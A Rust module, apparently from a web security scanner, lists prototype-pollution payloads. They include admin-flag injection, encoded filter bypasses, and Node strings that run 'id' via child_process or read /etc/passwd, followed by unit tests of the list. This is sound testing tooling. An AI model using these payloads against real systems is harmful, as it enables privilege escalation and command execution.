use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = payload_vec!(PayloadType::Prototype,
        "js-pollution", [
            ("__proto__", "Prototype pollution - __proto__ key", Severity::Critical),
            ("constructor", "Prototype pollution - constructor", Severity::Critical),
            ("__proto__.foo", "Prototype pollution - nested __proto__", Severity::Critical),
            ("constructor.prototype", "Prototype pollution - constructor.prototype", Severity::Critical),
            ("__proto__.__proto__", "Prototype pollution - double __proto__", Severity::Critical),
            ("__proto__.constructor", "Prototype pollution - __proto__.constructor", Severity::Critical),
            ("__defineGetter__", "Prototype pollution - __defineGetter__", Severity::High),
            ("__defineSetter__", "Prototype pollution - __defineSetter__", Severity::High),
            ("__lookupGetter__", "Prototype pollution - __lookupGetter__", Severity::Medium),
            ("__lookupSetter__", "Prototype pollution - __lookupSetter__", Severity::Medium),
        ];
        "js-pollution-values", [
            ("{\"__proto__\": {\"isAdmin\": true}}", "Pollute with admin flag", Severity::Critical),
            ("{\"constructor\": {\"prototype\": {\"isAdmin\": true}}}", "Pollute via constructor", Severity::Critical),
            ("{\"__proto__\": {\"role\": \"admin\"}}", "Pollute with admin role", Severity::Critical),
            ("{\"__proto__\": null}", "Pollute __proto__ to null", Severity::High),
            ("{\"constructor\": null}", "Pollute constructor to null", Severity::High),
            ("{\"__proto__\": {}}", "Pollute with empty object", Severity::High),
        ];
        "merge-pollution", [
            ("{\"__proto__\": {\"a\": 1}}", "Merge __proto__ pollution", Severity::Critical),
            ("{\"a\": 1, \"__proto__\": {\"b\": 2}}", "Merge with __proto__", Severity::Critical),
            ("{}; JSON.parse('{\"__proto__\": {\"x\": 1}}')", "JSON.parse pollution", Severity::Critical),
            ("[].concat({\"__proto__\": {}})", "Array concat pollution", Severity::Critical),
            ("Object.assign({}, {\"__proto__\": {\"x\": 1}})", "Object.assign pollution", Severity::Critical),
        ];
        "bypass", [
            ("%7B%22__proto__%22%3A%7B%22x%22%3A1%7D%7D", "URL encoded pollution", Severity::High),
            ("\\u005f\\u005fproto\\u005f\\u005f", "Unicode __proto__", Severity::High),
            ("%5F%5Fproto%5F%5F", "Percent encoded __proto__", Severity::High),
            ("__proto__\\x00", "Null byte suffix", Severity::Medium),
        ];
        "node-specific", [
            ("process.env", "Node process.env access", Severity::Critical),
            ("process.mainModule", "Node mainModule access", Severity::Critical),
            ("process.binding", "Node binding access", Severity::Critical),
            ("global.process", "Node global process", Severity::Critical),
            ("globalThis.process", "Node globalThis process", Severity::Critical),
            ("require('child_process').execSync('id')", "Node child_process exec", Severity::Critical),
            ("require('fs').readFileSync('/etc/passwd')", "Node fs readFile", Severity::Critical),
        ];
    );

    for p in &mut payloads {
        if !p.tags.contains(&"prototype-pollution".to_string()) {
            p.tags.push("prototype-pollution".to_string());
        }
    }

    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty(), "Prototype pollution payloads must not be empty");
    }

    #[test]
    fn all_payloads_are_prototype_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::Prototype);
        }
    }

    #[test]
    fn contains_proto_key() {
        let payloads = get_payloads();
        let has_proto = payloads.iter().any(|p| p.payload.contains("__proto__"));
        assert!(has_proto, "Must contain __proto__ key payloads");
    }

    #[test]
    fn contains_constructor() {
        let payloads = get_payloads();
        let has_constructor = payloads.iter().any(|p| p.payload.contains("constructor"));
        assert!(has_constructor, "Must contain constructor payloads");
    }

    #[test]
    fn contains_json_pollution() {
        let payloads = get_payloads();
        let has_json = payloads.iter().any(|p| {
            p.payload.contains("JSON.parse") || p.payload.contains("Object.assign")
        });
        assert!(has_json, "Must contain JSON-based pollution");
    }

    #[test]
    fn contains_node_specific() {
        let payloads = get_payloads();
        let has_node = payloads.iter().any(|p| {
            p.payload.contains("process") || p.payload.contains("require(")
        });
        assert!(has_node, "Must contain Node.js-specific payloads");
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 25,
            "Must have substantial prototype pollution coverage, got {}",
            payloads.len()
        );
    }
}
